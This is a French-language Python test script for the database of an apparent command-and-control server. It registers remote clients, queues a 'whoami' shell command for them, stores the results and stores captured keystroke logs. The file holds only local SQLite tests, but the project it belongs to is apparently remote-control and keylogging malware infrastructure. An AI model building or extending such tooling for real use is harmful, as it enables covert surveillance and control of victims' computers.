"""
Script de test pour la base de données
"""

import sys
import time
from database import Database

def test_database():
    """Tester les fonctionnalités de la base de données"""
    
    print("🧪 TEST DE LA BASE DE DONNÉES\n")
    
    # Utiliser une BD de test
    db = Database("test_c2.db")
    
    # Test 1: Enregistrement de clients
    print("Test 1: Enregistrement de clients...")
    test_client_id = "test_client_001"
    test_system_info = {
        "platform": "Windows",
        "hostname": "TEST-PC",
        "username": "testuser",
        "architecture": "x64"
    }
    
    success = db.register_client(test_client_id, test_system_info, "192.168.1.100")
    assert success, "❌ Échec de l'enregistrement du client"
    print("✅ Client enregistré avec succès")
    
    # Test 2: Récupération de client
    print("\nTest 2: Récupération de client...")
    client = db.get_client(test_client_id)
    assert client is not None, "❌ Client non trouvé"
    assert client['client_id'] == test_client_id, "❌ Client ID incorrect"
    print(f"✅ Client récupéré: {client['client_id']}")
    
    # Test 3: Mise à jour heartbeat
    print("\nTest 3: Mise à jour heartbeat...")
    time.sleep(1)
    success = db.update_client_heartbeat(test_client_id)
    assert success, "❌ Échec de la mise à jour du heartbeat"
    
    client_updated = db.get_client(test_client_id)
    assert client_updated['last_seen'] > client['last_seen'], "❌ Last seen non mis à jour"
    assert client_updated['checkin_count'] == 2, "❌ Checkin count incorrect"
    print(f"✅ Heartbeat mis à jour, checkins: {client_updated['checkin_count']}")
    
    # Test 4: Ajout de commandes
    print("\nTest 4: Ajout de commandes...")
    cmd_id = "cmd_test_001"
    success = db.add_command(test_client_id, cmd_id, "shell", {"command": "whoami"})
    assert success, "❌ Échec de l'ajout de commande"
    print("✅ Commande ajoutée")
    
    # Test 5: Récupération de commandes
    print("\nTest 5: Récupération de commandes...")
    commands = db.get_pending_commands(test_client_id)
    assert len(commands) == 1, f"❌ Nombre de commandes incorrect: {len(commands)}"
    assert commands[0]['command_id'] == cmd_id, "❌ Command ID incorrect"
    print(f"✅ {len(commands)} commande(s) récupérée(s)")
    
    # Test 6: Ajout de résultats
    print("\nTest 6: Ajout de résultats...")
    test_result = {"output": "test_user", "success": True}
    success = db.add_command_result(cmd_id, test_client_id, test_result)
    assert success, "❌ Échec de l'ajout du résultat"
    print("✅ Résultat ajouté")
    
    # Test 7: Récupération de résultats
    print("\nTest 7: Récupération de résultats...")
    result_data = db.get_command_result(cmd_id)
    assert result_data is not None, "❌ Résultat non trouvé"
    assert result_data['result']['success'] == True, "❌ Résultat incorrect"
    print(f"✅ Résultat récupéré: {result_data['result']}")
    
    # Test 8: Ajout de keylogs
    print("\nTest 8: Ajout de keylogs...")
    test_keylogs = [
        {"timestamp": "2025-01-27T10:00:00", "window": "Notepad", "key": "H", "event": "keypress"},
        {"timestamp": "2025-01-27T10:00:01", "window": "Notepad", "key": "e", "event": "keypress"},
        {"timestamp": "2025-01-27T10:00:02", "window": "Notepad", "key": "l", "event": "keypress"},
        {"timestamp": "2025-01-27T10:00:03", "window": "Notepad", "key": "l", "event": "keypress"},
        {"timestamp": "2025-01-27T10:00:04", "window": "Notepad", "key": "o", "event": "keypress"},
    ]
    success = db.add_keylogs(test_client_id, test_keylogs)
    assert success, "❌ Échec de l'ajout des keylogs"
    print(f"✅ {len(test_keylogs)} keylogs ajoutés")
    
    # Test 9: Récupération de keylogs
    print("\nTest 9: Récupération de keylogs...")
    keylogs = db.get_keylogs(test_client_id, limit=10)
    assert len(keylogs) == 5, f"❌ Nombre de keylogs incorrect: {len(keylogs)}"
    print(f"✅ {len(keylogs)} keylogs récupérés")
    
    # Test 10: Statistiques keylogs
    print("\nTest 10: Statistiques keylogs...")
    stats = db.get_keylog_stats()
    assert stats['total_clients_with_logs'] == 1, "❌ Nombre de clients incorrect"
    assert stats['total_logs_stored'] == 5, f"❌ Total logs incorrect: {stats['total_logs_stored']}"
    print(f"✅ Stats: {stats['total_clients_with_logs']} clients, {stats['total_logs_stored']} logs")
    
    # Test 11: Log d'activité
    print("\nTest 11: Log d'activité...")
    db.log_activity(test_client_id, "test", "Test activity")
    activities = db.get_activity_log(test_client_id, limit=10)
    assert len(activities) > 0, "❌ Aucune activité trouvée"
    print(f"✅ {len(activities)} activités enregistrées")
    
    # Test 12: Récupération de tous les clients
    print("\nTest 12: Récupération de tous les clients...")
    all_clients = db.get_all_clients()
    assert len(all_clients) >= 1, "❌ Aucun client trouvé"
    print(f"✅ {len(all_clients)} client(s) dans la BD")
    
    # Test 13: Ajout d'un deuxième client
    print("\nTest 13: Ajout d'un deuxième client...")
    test_client_2 = "test_client_002"
    success = db.register_client(test_client_2, {"platform": "Linux"}, "192.168.1.101")
    assert success, "❌ Échec de l'ajout du 2ème client"
    all_clients = db.get_all_clients()
    assert len(all_clients) == 2, f"❌ Nombre de clients incorrect: {len(all_clients)}"
    print(f"✅ {len(all_clients)} clients au total")
    
    # Test 14: Nettoyage
    print("\nTest 14: Nettoyage de la BD...")
    
    # Simuler l'inactivité en mettant à jour manuellement
    import sqlite3
    conn = db.get_connection()
    cursor = conn.cursor()
    old_time = time.time() - 7200  # 2 heures
    cursor.execute('UPDATE clients SET last_seen = ? WHERE client_id = ?', (old_time, test_client_2))
    conn.commit()
    
    deleted = db.cleanup_old_clients(max_age_seconds=3600)
    assert deleted == 1, f"❌ Nombre de clients supprimés incorrect: {deleted}"
    print(f"✅ {deleted} client(s) inactif(s) supprimé(s)")
    
    # Vérifier qu'il reste 1 client
    all_clients = db.get_all_clients()
    assert len(all_clients) == 1, f"❌ Nombre de clients après nettoyage incorrect: {len(all_clients)}"
    print(f"✅ {len(all_clients)} client(s) restant(s)")
    
    # Fermer la connexion
    db.close()
    
    print("\n" + "="*50)
    print("✅ TOUS LES TESTS SONT PASSÉS AVEC SUCCÈS!")
    print("="*50)
    
    # Nettoyer le fichier de test
    import os
    try:
        os.remove("test_c2.db")
        print("\n🧹 Fichier de test supprimé")
    except:
        pass


if __name__ == "__main__":
    try:
        test_database()
    except AssertionError as e:
        print(f"\n❌ TEST ÉCHOUÉ: {e}")
        sys.exit(1)
    except Exception as e:
        print(f"\n❌ ERREUR: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)
